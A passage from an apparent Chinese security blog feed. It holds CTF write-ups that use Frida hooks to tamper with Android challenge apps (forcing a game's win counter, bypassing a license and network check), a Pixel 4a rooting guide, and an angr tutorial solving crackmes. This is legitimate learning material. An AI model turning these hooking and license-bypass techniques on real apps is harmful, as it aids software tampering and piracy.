class=\"token punctuation\">.</span>cnt<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WIN! +\"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token comment\">// 获胜 1000 次则能够获取 flag</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1000</span> <span class=\"token operator\">==</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SECCON&#123;\"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt <span class=\"token operator\">+</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">calc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">107</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>可以看到分析 calc () 方法能算出答案，但这个方法在 so 中，得分析汇编代码才行，可以尝试使用 ida</p>\n<p>这里我们用 frida hook 解决 让 cnt 的值构造成 1000 即可</p>\n<pre><code>frida -U -l test.js -f com.example.seccon2015.rock_paper_scissors\n</code></pre>\n<p><img data-src=\"/images/image-20230428165101481.png\" alt=\"image-20230428165101481\"></p>\n<p>JS 脚本:</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token comment\">// 选择类</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">const</span> MainActivity <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'com.example.seccon2015.rock_paper_scissors.MainActivity'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">// 选择 onClick 方法</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">const</span> onClick <span class=\"token operator\">=</span> MainActivity<span class=\"token punctuation\">.</span>onClick<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// hook onClick</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  onClick<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\">// 函数被调用的时候打印一条消息</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">send</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'onClick'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// 调用原始的 onClick 方法</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">onClick</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 调用完之后修改 m,n,cnt 的值</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>m<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token number\">999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">//frida 控制台打印结果</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">//hook 结束</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'Done:'</span> <span class=\"token punctuation\">,</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"/images/IMG_3353.JPG\" alt=\"IMG_3353\"></p>\n<h4 id=\"whyshouldipay\"><a class=\"markdownIt-Anchor\" href=\"#whyshouldipay\">#</a> WhyShouldIPay</h4>\n<p><img data-src=\"/images/E2951965E57EE62ECEAE38BF90CA3C74.png\" alt=\"E2951965E57EE62ECEAE38BF90CA3C74\"></p>\n<p>PREMIUM CONETNT 内容需要输入 License 验证后才能看</p>\n<p><img data-src=\"/images/image-20230525224401533.png\" alt=\"image-20230525224401533\"></p>\n<p>MainActivity 中看到 xor 加密方法 按 x 查找用例</p>\n<p><img data-src=\"/images/image-20230525225126860.png\" alt=\"image-20230525225126860\"></p>\n<p>发现 LauncherActivity 是验证部分，前面有个网络验证，显然需要绕过，后面调用了 xor 方法运算</p>\n<p><img data-src=\"/images/image-20230525232412393.png\" alt=\"image-20230525232412393\"></p>\n<p>先 hook 一下看 mac 值</p>\n<p>直接构造 Key 再 hook verifyClick 方法 直接 show flag 即可</p>\n<p><img data-src=\"/images/image-20230525233305169.png\" alt=\"image-20230525233305169\"></p>\n<p><img data-src=\"/images/F4D85F20BD673EB118AB34E387218A17.png\" alt=\"F4D85F20BD673EB118AB34E387218A17\"></p>\n<h2 id=\"坑\"><a class=\"markdownIt-Anchor\" href=\"#坑\">#</a> 坑</h2>\n<p>Frida 版本一定不要高！！！</p>\n<p>安卓手机版本太高 搞了我 10 个小时 焯！</p>\n<p><img data-src=\"/images/image-20230428115227442.png\" alt=\"image-20230428115227442\"></p>\n<p>心态爆炸之又重新换成安卓 10 又 ROOT 之终于成功了</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/04/25/pixel-4a-root/",
            "url": "https://3cly.github.io/2023/04/25/pixel-4a-root/",
            "title": "pixel 4a root",
            "date_published": "2023-04-25T13:44:31.000Z",
            "content_html": "<h1 id=\"pixel-4a-root\"><a class=\"markdownIt-Anchor\" href=\"#pixel-4a-root\">#</a> pixel 4a root</h1>\n<p>安卓手机型号:pixel 4a</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424202332.png\" alt=\"QQ图片20230424202332\"></p>\n<p><strong>电脑</strong>先下载 SDK 平台工具 (<strong>保证有 adb 和 fastboot</strong>)</p>\n<p><strong>手机</strong>在重启的时候在黑屏的瞬间按住音量键的减小键几秒钟，直到屏幕变成这种状态，USB 连接至电脑</p>\n<p>在电脑运行</p>\n<pre><code>fastboot flashing unlock\n</code></pre>\n<img data-src=\"/images/IMG_3302.JPG\" alt=\"IMG_3302\">\n<p>调节选项 选择 unlock 再按电源键确认</p>\n<p><img data-src=\"/images/IMG_3300.JPG\" alt=\"IMG_3300\"></p>\n<p>在 github 上下载一个 Magisk.apk 在安卓手机上安装</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424205338.png\" alt=\"QQ图片20230424205338\"></p>\n<p>在安卓谷歌官网找一个<strong>和你手机版本相同的镜像</strong> zip, 解压后找出 boot.img 文件 push 给手机</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424205913.png\" alt=\"QQ图片20230424205913\"></p>\n<p>利用 Magisk 修复镜像</p>\n<p><img data-src=\"/images/IMG_3301.JPG\" alt=\"IMG_3301\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424210621.png\" alt=\"QQ图片20230424210621\"></p>\n<p>修复完后他会在相同目录保存修复后的 img 给它 pull 回电脑</p>\n<h5 id=\"出现的问题及解决\"><a class=\"markdownIt-Anchor\" href=\"#出现的问题及解决\">#</a> 出现的问题及解决</h5>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424211231.png\" alt=\"QQ图片20230424211231\"></p>\n<p>破防之 fastboot 下载谷歌 USB 驱动后还是没搞懂</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424211506.png\" alt=\"QQ图片20230424211506\"> 又在网上搜到说是版本问题之又下了两个版本还是不行最后<img data-src=\"/images/image-20230424223839731.png\" alt=\"image-20230424223839731\"></p>\n<p>又突然可以了 (估计是我之前没有 bootloader…)</p>\n<h5 id=\"成功\"><a class=\"markdownIt-Anchor\" href=\"#成功\">#</a> 成功！</h5>\n<p><img data-src=\"/images/image-20230425212930029.png\" alt=\"image-20230425212930029\"></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/04/16/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "url": "https://3cly.github.io/2023/04/16/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "title": "Angr符号执行学习笔记",
            "date_published": "2023-04-16T12:50:29.000Z",
            "content_html": "<h1 id=\"angr学习\"><a class=\"markdownIt-Anchor\" href=\"#angr学习\">#</a> Angr 学习</h1>\n<p>学习 angr 借鉴了 Syclover 战队大佬 SYJ 的笔记 https://agate-colony-3f5.notion.site/angr_ctf-8a26aa74a4a74c428ef6129e2df6dd02</p>\n<h2 id=\"angr\"><a class=\"markdownIt-Anchor\" href=\"#angr\">#</a> Angr</h2>\n<p>angr 是一个二进制分析框架，它可以用于静态和动态分析，以及漏洞发现等方面。它被设计用来处理二进制文件，包括 ELF，PE 和 Mach-O 等文件格式。</p>\n<p>angr 提供了一个 Python API，可以用来编写脚本来自动化分析过程。它支持多种分析技术，包括符号执行，动态符号执行和模糊测试等。它还提供了一些有用的工具，如符号执行器、符号内存和符号寄存器等，以帮助用户进行深入的分析。</p>\n<p>angr 的一个优点是它可以在不需要人工干预的情况下进行自动化分析。这使其成为安全研究人员和漏洞猎人的有用工具，他们可以使用 angr 来自动发现漏洞并生成利用代码。</p>\n<h3 id=\"使用-angr-的大概步骤\"><a class=\"markdownIt-Anchor\" href=\"#使用-angr-的大概步骤\">#</a> 使用 angr 的大概步骤</h3>\n<ul>\n<li>创建 project</li>\n<li>设置 state</li>\n<li>新建 符号量 : BVS (bitvector symbolic) 或 BVV (bitvector value) [约束求解时的自变量，可类比 z3]</li>\n<li>把符号量设置到内存或者其他地方 (这两步非必须)</li>\n<li>设置 Simulation Managers ， 进行路径探索的对象</li>\n<li>运行，探索满足路径需要的值</li>\n<li>约束求解，获取执行结果</li>\n</ul>\n<h3 id=\"00_angr_find\"><a class=\"markdownIt-Anchor\" href=\"#00_angr_find\">#</a> 00_angr_find</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 加载可执行文件路径</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./00_angr_find\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 找到入口</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 创建模拟管理器，支持搜索和执行</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 设置要进入的位置:integer (probably in hexadecimal)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span><span class=\"token number\">0x08048678</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 查看结果状态</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># 输出结果</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/images/image-20230407212823955.png\" alt=\"image-20230407212823955\"></p>\n<p><img data-src=\"/images/image-20230407212849218.png\" alt=\"image-20230407212849218\"></p>\n<h3 id=\"01_angr_avoid\"><a class=\"markdownIt-Anchor\" href=\"#01_angr_avoid\">#</a> 01_angr_avoid</h3>\n<p>使用.explore () 方法的另一个参数 avoid 来回避 avoid_me 函数即可 (如果 IDA 按 TAB 会提示 main 函数过大)<img data-src=\"/images/image-20230410164448520.png\" alt=\"image-20230410164448520\"></p>\n<p>直接找到 2 个函数的地址就能写脚本了</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 加载可执行文件路径</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./01_angr_avoid\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 找到入口</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 创建模拟管理器，支持搜索和执行</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 设置要进入的位置，回避的函数</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span><span class=\"token number\">0x80485f7</span><span class=\"token punctuation\">,</span>avoid<span class=\"token operator\">=</span><span class=\"token number\">0x80485bf</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 查看结果状态</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># 输出结果</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>结果:</strong></p>\n<pre><code>root@mou-virtual-machine:/home/mou/桌面/angr_ctf-master/solutions/01_angr_avoid#\n python3 try.py\nWARNING  | 2023-04-10 16:51:27,641 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing register with an unspecified value. This could indicate unwanted behavior.\nWARNING  | 2023-04-10 16:51:27,641 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:\nWARNING  | 2023-04-10 16:51:27,642 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state\nWARNING  | 2023-04-10 16:51:27,642 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null\nWARNING  | 2023-04-10 16:51:27,642 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to suppress these messages.\nWARNING  | 2023-04-10 16:51:27,642 | angr.storage.memory_mixins.default_filler_mixin | Filling register edi with 4 unconstrained bytes referenced from 0x80d45b1 (__libc_csu_init+0x1 in 01_angr_avoid (0x80d45b1))\nWARNING  | 2023-04-10 16:51:31,839 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff3d with 11 unconstrained bytes referenced from 0x819b3b0 (strncmp+0x0 in libc.so.6 (0x9b3b0))\nWARNING  | 2023-04-10 16:51:31,839 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff60 with 4 unconstrained bytes referenced from 0x819b3b0 (strncmp+0x0 in libc.so.6 (0x9b3b0))\nb'JLVUSGJZ'\nroot@mou-virtual-machine:/home/mou/桌面/angr_ctf-master/solutions/01_angr_avoid#\n ./01_angr_avoid\nEnter the password: JLVUSGJZ\nGood Job.\n</code></pre>\n<h3 id=\"02_angr_find_condition\"><a class=\"markdownIt-Anchor\" href=\"#02_angr_find_condition\">#</a> 02_angr_find_condition</h3>\n<p>学习根据程序本身的输出来告诉 angr 应避免或保留的内容，而不是每次都找打印错误提示的函数地址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./02_angr_find_condition\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">,</span> auto_load_libs<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#输出内容放到变量中</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b'Good Job.'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b'Try again.'</span> <span class=\"token keyword\">in</span>  stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Solution is: &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    Go<span class=\"token punctuation\">(</span><span class=\"token 